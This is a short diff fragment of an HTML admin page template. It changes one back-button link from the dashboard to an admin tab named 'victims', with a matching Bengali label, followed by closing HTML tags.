-                    <div style="margin-top:24px;"><a href="/admin/dashboard" class="btn-back"><i class="fas fa-arrow-left"></i> ড্যাশবোর্ডে ফিরুন</a></div>
+                    <div style="margin-top:24px;"><a href="/admin?tab=victims" class="btn-back"><i class="fas fa-arrow-left"></i> ভিক্টিম পেজে ফিরুন</a></div>
                 </div>
             </body>
             </html>
